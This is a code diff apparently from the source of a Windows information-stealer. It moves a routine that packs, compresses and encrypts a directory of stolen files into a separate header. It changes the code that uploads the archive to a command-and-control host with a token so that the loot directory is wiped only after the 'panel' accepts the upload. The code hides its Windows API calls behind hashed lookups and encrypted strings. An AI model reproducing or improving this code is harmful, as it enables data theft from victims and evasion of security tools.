@@ -113,149 +113,8 @@ extern int mirage_collect_system_info(char *output, size_t outlen);
 
 #ifdef ENABLE_C2_EXFIL
 #include "file_utils.h"
+#include "packer.h"
 #include <stdint.h>
-
-/* ── PEB-walk singleton for Find* APIs ─────────────────────────── */
-typedef HANDLE (WINAPI *pFindFirstFileA)(LPCSTR, LPWIN32_FIND_DATAA);
-typedef BOOL   (WINAPI *pFindNextFileA)(HANDLE, LPWIN32_FIND_DATAA);
-typedef BOOL   (WINAPI *pFindClose)(HANDLE);
-
-static struct {
-    pFindFirstFileA pFF;
-    pFindNextFileA  pFN;
-    pFindClose      pFC;
-    int ready;
-} g_main_find;
-
-static int main_find_ensure_api(void) {
-    if (g_main_find.ready) return 1;
-    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
-    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
-    if (!k32) return 0;
-    char fn[32];
-    enc_decrypt(enc_FindFirstFileA, ENC_FINDFIRSTFILEA_LEN, fn);
-    g_main_find.pFF = (pFindFirstFileA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
-    enc_decrypt(enc_FindNextFileA, ENC_FINDNEXTFILEA_LEN, fn);
-    g_main_find.pFN = (pFindNextFileA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
-    enc_decrypt(enc_FindClose, ENC_FINDCLOSE_LEN, fn);
-    g_main_find.pFC = (pFindClose)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
-    if (!g_main_find.pFF || !g_main_find.pFN || !g_main_find.pFC) return 0;
-    g_main_find.ready = 1;
-    return 1;
-}
-
-/* Pack all files in output_dir into an encrypted archive buffer.
- * Returns malloc'd buffer and sets out_len, or NULL on failure. */
-static unsigned char *pack_and_encrypt_dir(const char *dir, size_t *out_len) {
-    if (!main_find_ensure_api()) return NULL;
-    /* First pass: compute total size */
-    size_t total = 0;
-    int file_count = 0;
-    char find_path[MAX_PATH];
-    snprintf(find_path, sizeof(find_path), "%s\\*", dir);
-
-    WIN32_FIND_DATAA ffd;
-    HANDLE hf = g_main_find.pFF(find_path, &ffd);
-    if (hf == INVALID_HANDLE_VALUE) return NULL;
-
-    do {
-        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
-        size_t name_len = strlen(ffd.cFileName);
-        total += 4 + name_len + 4 + (size_t)ffd.nFileSizeLow + ((size_t)ffd.nFileSizeHigh << 32);
-        file_count++;
-    } while (g_main_find.pFN(hf, &ffd) != 0);
-    g_main_find.pFC(hf);
-
-    if (file_count == 0) return NULL;
-
-    /* Allocate +4 for file_count header */
-    unsigned char *buf = (unsigned char *)malloc(total + 4);
-    if (!buf) return NULL;
-
-    /* Second pass: write data */
-    size_t off = 0;
-
-    /* Write file count at start */
-    buf[off++] = (unsigned char)(file_count);
-    buf[off++] = (unsigned char)(file_count >> 8);
-    buf[off++] = (unsigned char)(file_count >> 16);
-    buf[off++] = (unsigned char)(file_count >> 24);
-
-    hf = g_main_find.pFF(find_path, &ffd);
-    if (hf == INVALID_HANDLE_VALUE) { free(buf); return NULL; }
-
-    do {
-        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
-
-        size_t name_len = strlen(ffd.cFileName);
-        /* Write filename length + filename */
-        buf[off++] = (unsigned char)(name_len);
-        buf[off++] = (unsigned char)(name_len >> 8);
-        memcpy(buf + off, ffd.cFileName, name_len);
-        off += name_len;
-
-        /* Write file contents */
-        char file_path[MAX_PATH];
-        snprintf(file_path, sizeof(file_path), "%s\\%s", dir, ffd.cFileName);
-        size_t flen = 0;
-        unsigned char *fdata = read_file(file_path, &flen);
-        if (fdata) {
-            buf[off++] = (unsigned char)(flen);
-            buf[off++] = (unsigned char)(flen >> 8);
-            buf[off++] = (unsigned char)(flen >> 16);
-            buf[off++] = (unsigned char)(flen >> 24);
-            memcpy(buf + off, fdata, flen);
-            off += flen;
-            free(fdata);
-        } else {
-            buf[off++] = 0; buf[off++] = 0; buf[off++] = 0; buf[off++] = 0;
-        }
-    } while (g_main_find.pFN(hf, &ffd) != 0);
-    g_main_find.pFC(hf);
-
-#ifdef ENABLE_COMPRESSION
-    /* LZ4-compress the packed TLV buffer before encryption */
-    {
-        size_t packed_len = off;  /* snapshot: off won't change during compress */
-        int comp_bound = lz4_compress_bound((int)packed_len);
-        unsigned char *comp = (unsigned char *)malloc((size_t)comp_bound + 5);
-        if (comp) {
-            int comp_len = lz4_compress((const char *)buf, (char *)(comp + 5),
-                                         (int)packed_len, comp_bound);
-            if (comp_len > 0 && (size_t)comp_len < packed_len) {
-                comp[0] = 0x01; /* magic: LZ4 compressed */
-                /* Store original uncompressed size as LE uint32 */
-                comp[1] = (unsigned char)(packed_len);
-                comp[2] = (unsigned char)(packed_len >> 8);
-                comp[3] = (unsigned char)(packed_len >> 16);
-                comp[4] = (unsigned char)(packed_len >> 24);
-                free(buf);
-                buf = comp;
-                off = (size_t)comp_len + 5;
-            } else {
-                free(comp);
-                /* keep original uncompressed buf */
-            }
-        }
-        /* If malloc fails, skip compression and send uncompressed */
-    }
-#endif
-
-    /* Encrypt with ChaCha20-Poly1305 via archive_crypt */
-    size_t enc_cap = off + 64; /* header + padding */
-    unsigned char *enc = (unsigned char *)malloc(enc_cap);
-    if (!enc) { free(buf); return NULL; }
-
-    size_t enc_len = enc_cap;
-    if (archive_encrypt(buf, off, NULL, 0, enc, &enc_len) < 0) {
-        free(buf); free(enc);
-        return NULL;
-    }
-
-    free(buf);
-    *out_len = enc_len;
-    return enc;
-}
 #endif
 
 /* ── PEB-walk singleton for main.c kernel32/shell32 APIs ──────── */
@@ -683,8 +542,11 @@ int main(int argc, char *argv[]) {
             snprintf(metadata, sizeof(metadata),
                      "{\"host\":\"%s\",\"user\":\"%s\"}",
                      "unknown", getenv("USERNAME") ? getenv("USERNAME") : "unknown");
-            upload_log(C2_HOST, C2_PORT, C2_TOKEN,
-                       archive, archive_len, metadata);
+            /* upload_log: 0 = HTTP 200 confirmed, -1 = failure.
+             * exfil_ok gates loot-dir removal below — only wipe after
+             * the panel actually accepted the archive. */
+            exfil_ok = (upload_log(C2_HOST, C2_PORT, C2_TOKEN,
+                                   archive, archive_len, metadata) == 0);
             free(archive);
         }
     }
